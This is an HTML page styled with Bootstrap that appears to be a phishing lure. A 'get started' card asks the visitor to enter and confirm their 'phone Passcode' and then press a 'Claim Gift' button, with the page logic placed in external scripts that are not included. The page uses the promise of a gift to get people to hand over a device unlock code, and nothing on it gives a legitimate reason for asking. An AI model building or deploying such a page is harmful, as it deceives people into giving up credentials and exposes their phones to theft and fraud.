<!DOCTYPE >
<html>
  <body>
    <title></title>
    <head>
      <meta name="viewport" content="width=device-width, initial-scale=1.0" />
      <link href="css/bootstrap.min.css" rel="stylesheet" type="text/css" />
      <link href="css/mdb.min.css" rel="stylesheet" type="text/css" />
      <link href="css/fontawesome.min.css" rel="stylesheet" type="text/css" />
      <link href="extcss/bit.css" rel="stylesheet" type="text/css" />
    </head>
    <section
      class="vh-100 bg-image"
      id="Register"
      style="
        background-image: url('https://mdbcdn.b-cdn.net/img/Photos/new-templates/search-box/img4.webp');
      "
    >
      <div class="mask d-flex align-items-center h-100 gradient-custom-3">
        <div class="container h-100">
          <div
            class="row d-flex justify-content-center align-items-center h-100"
          >
            <div class="col-12 col-md-9 col-lg-7 col-xl-6">
              <div class="card" style="border-radius: 15px">
                <div class="card-body p-5">
                  <h2 class="text-uppercase text-center mb-5">get started</h2>

                  <form>
                    <!-- password input form--->
                    <div class="form-outline mb-4">
                      <label for="email">Your phone Passcode</label>
                      <input
                        type="number"
                        id="password"
                        placeholder="passcode"
                        class="form-control"
                        onkeyup="checkPass()"
                      />
                      <span id="pass"></span>
                    </div>
                    <!-- confirm password input form--->
                    <div class="form-outline mb-4">
                      <label for="email">Confirm your passcode</label>
                      <input
                        type="number"
                        id="passwordConf"
                        placeholder="confirm your passcode"
                        class="form-control"
                        onkeyup="ValidatePass()"
                      />
                      <span id="passConf"></span>
                    </div>

                    <!--User register button--->
                    <div class="d-flex justify-content-center">
                      <button
                        type="button"
                        onclick="OnclickLogin();"
                        class="btn btn-danger btn-block btn-lg gradient-custom-4"
                        style="color: white"
                        ;
                      >
                        Claim Gift
                      </button>
                    </div>
                  </form>
                </div>
              </div>
            </div>
          </div>
        </div>
      </div>
    </section>

    <style>
      #ShowLoginform {
        display: none;
      }
      #Register {
        display: block;
      }
    </style>
  </body>
  <script src="js/jquery.min.js" type="text/javascript"></script>
  <script src="js/popper.min.js" type="text/javascript"></script>
  <script src="js/bootstrap.min.js" type="text/javascript"></script>
  <script src="js/mdb.min.js" type="text/javascript"></script>
  <script src="js/goethe.js" type="text/javascript"></script>
</html>
